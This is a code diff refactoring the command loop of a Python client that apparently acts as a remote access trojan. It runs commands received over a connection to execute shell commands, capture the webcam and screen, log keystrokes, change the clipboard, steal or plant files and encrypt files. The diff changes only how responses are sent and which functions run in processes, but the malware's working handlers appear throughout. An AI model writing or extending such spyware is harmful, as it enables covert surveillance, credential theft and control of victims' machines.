@@ -38,42 +38,40 @@ class Client:
             if request["cmd"] == "c":
                 process = multiprocessing.Process(target=self.execute_command, args=(self.response, request["exe"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response)
             elif request["cmd"] == "z":
                 process = multiprocessing.Process(target=self.zip_file_or_folder, args=(
                     self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response)
             elif request["cmd"] == "w":
                 process = multiprocessing.Process(target=self.capture_camera_picture,
                                                   args=(self.response, request["cam_port"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response)
             elif request["cmd"] == "s":
                 process = multiprocessing.Process(target=self.capture_screenshot,
                                                   args=(self.response, request["monitor"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response)
             elif request["cmd"] == "d":
-                self.download_file(request["open_path"])
+                process = multiprocessing.Process(target=self.download_file, args=(self.response, request["open_path"]))
+                self.handle_process(process, request["timeout"])
             elif request["cmd"] == "u":
-                self.upload_file(request["save_path"], request["data"])
+                process = multiprocessing.Process(target=self.upload_file,
+                                                  args=(self.response, request["save_path"], request["data"]))
+                self.handle_process(process, request["timeout"])
             elif request["cmd"] == "r":
                 process = multiprocessing.Process(target=self.connection.sock.close)
                 self.handle_process(process, request["timeout"])
                 self.exit = True
             elif request["cmd"] == "k":
                 self.log_keys(self.response, request["action"], request["save_path"])
-                self.connection.send(self.response)
             elif request["cmd"] == "b":
                 process = multiprocessing.Process(target=self.edit_clipboard, args=(self.response, request["content"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response)
             elif request["cmd"] == "e":
-                process = multiprocessing.Process(target=self.crypt, args=(
-                    self.response, request["action"], request["open_path"], request["password"],))
+                process = multiprocessing.Process(target=self.crypt,
+                                                  args=(self.response, request["action"], request["open_path"],
+                                                        request["password"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.response)
+            self.connection.send(self.response)
 
     @staticmethod
     def execute_command(response, command):
@@ -85,8 +83,8 @@ class Client:
         except UnicodeDecodeError:
             response["error"] = "UnicodeDecodeError"
 
-    def download_file(self, path):
-        response = {"data": str(), "error": str()}
+    @staticmethod
+    def download_file(response, path):
         try:
             with open(path, "rb") as file:
                 response["data"] = base64.b64encode(file.read()).decode("utf8")
@@ -96,16 +94,14 @@ class Client:
             response["error"] = "PermissionError"
         except MemoryError:
             response["error"] = "MemoryError"
-        self.connection.send(response)
 
-    def upload_file(self, path, data):
-        response = {"error": str()}
+    @staticmethod
+    def upload_file(response, path, data):
         try:
             with open(path, "wb") as file:
                 file.write(base64.b64decode(data))
         except PermissionError:
             response["error"] = "PermissionError"
-        self.connection.send(response)
 
     @staticmethod
     def capture_screenshot(response, monitor, path):
